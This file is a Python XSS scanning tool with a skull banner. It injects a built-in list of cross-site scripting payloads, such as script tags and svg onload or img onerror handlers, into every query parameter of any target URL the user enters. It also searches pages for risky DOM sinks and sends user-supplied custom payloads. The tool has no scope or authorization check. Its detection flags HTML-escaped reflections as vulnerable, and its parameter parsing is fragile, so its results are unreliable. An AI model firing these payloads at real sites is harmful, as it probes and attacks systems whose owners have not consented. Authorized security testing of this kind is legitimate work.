import requests
from urllib.parse import urlparse, urlencode
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt

console = Console()

tool_banner = """[bold red]
███████████████████████████
███████▀▀▀░░░░░░░▀▀▀███████
████▀░░░░░░░░░░░░░░░░░▀████
███│░░░░░░░░░░░░░░░░░░░│███
██▌│░░░░░░░░░░░░░░░░░░░│▐██
██░└┐░░░░░░░░░░░░░░░░░┌┘░██
██░░└┐░░░░░░░░░░░░░░░┌┘░░██
██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
██▌░│██████▌░░░▐██████│░▐██
███░│▐███▀▀░░▄░░▀▀███▌│░███
██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
████▄─┘██▌░░░░░░░▐██└─▄████
█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
███████▄░░░░░░░░░░░▄███████
██████████▄▄▄▄▄▄▄██████████
███████████████████████████
"""

description = """[blue]
[1] Reflected XSSㅤ: Test For Input Based Reflection
[2] DOM Based XSSㅤ: Detect Risky JavaScript
[3] Custom Payload : Use Your Own Payload To Test
[0] Exit , Closed Tools ⚙ 
"""

menu = """
[+] SELECTㅤ:
    [1] Reflected XSS Scan
    [2] DOM Based XSS
    [3] Custom Payloads
    [0] Exit , Close 
"""

xss_payloads = [
    "<script>alert(1337)</script>",
    "\"><script>alert(1337)</script>",
    "';alert(1337)//",
    "<svg/onload=alert(1337)>",
    "<img src=x onerror=alert(1337)>",
    "<body onload=alert(1337)>",
    "<details open ontoggle=alert(1337)>",
    "<iframe src=javascript:alert(1337)>"
]

def is_xss_triggered(response_text, payload):
    return payload in response_text or payload.replace("<", "&lt;") in response_text

def scan_reflected_xss(base_url):
    console.print("Run Reflected XSS Test...", style="red")
    parsed = urlparse(base_url)
    query = parsed.query

    if "=" not in query:
        console.print("No Query Parameters To Test", style="red")
        return

    base = base_url.split("?")[0]
    params = dict([kv.split("=") for kv in query.split("&")])

    for payload in xss_payloads:
        injected = {k: payload for k in params}
        full_url = base + "?" + urlencode(injected)
        try:
            r = requests.get(full_url, timeout=10)
            if is_xss_triggered(r.text, payload):
                console.print(f"[VULNERABLE] {full_url}", style="green")
            else:
                console.print(f"[SAFE] {payload}", style="red")
        except Exception as e:
            console.print(f"[ERROR] {str(e)}", style="red")

def scan_dom_xss(base_url):
    try:
        r = requests.get(base_url, timeout=10)
        dom_signatures = [
            'document.write', 'innerHTML', 'location.hash', 'eval(',
            'setTimeout(', 'document.URL', 'document.location'
        ]
        found = [s for s in dom_signatures if s in r.text]
        if found:
            console.print(f"[POSSIBLE DOM XSS] {', '.join(found)}", style="green")
        else:
            console.print("No DOM patterns found", style="red")
    except Exception as e:
        console.print(f"[ERROR] {str(e)}", style="red")

def test_custom_payload(base_url):
    payload = Prompt.ask("Enter your payload")
    parsed = urlparse(base_url)
    query = parsed.query

    if "=" not in query:
        console.print("No Query Parameters Found", style="red")
        return

    base = base_url.split("?")[0]
    params = dict([kv.split("=") for kv in query.split("&")])
    injected = {k: payload for k in params}
    full_url = base + "?" + urlencode(injected)
    try:
        r = requests.get(full_url, timeout=10)
        if is_xss_triggered(r.text, payload):
            console.print(f"[VULNERABLE] {full_url}", style="green")
        else:
            console.print(f"[SAFE] {payload}", style="red")
    except Exception as e:
        console.print(f"[ERROR] {str(e)}", style="red")

def main():
    console.print(tool_banner)
    console.print(Panel(description.strip(), style="blue", width=60))
    url = Prompt.ask("Enter Target URLㅤ")
    console.print(menu)
    choice = Prompt.ask("Option", choices=["1", "2", "3", "0"], default="1")

    if choice == "1":
        scan_reflected_xss(url)
    elif choice == "2":
        scan_dom_xss(url)
    elif choice == "3":
        test_custom_payload(url)
    elif choice == "0":
        console.print("Exited", style="red")
        return

    console.print("Scan CompleTed .", style="green")
    exit()

if __name__ == "__main__":
    main()
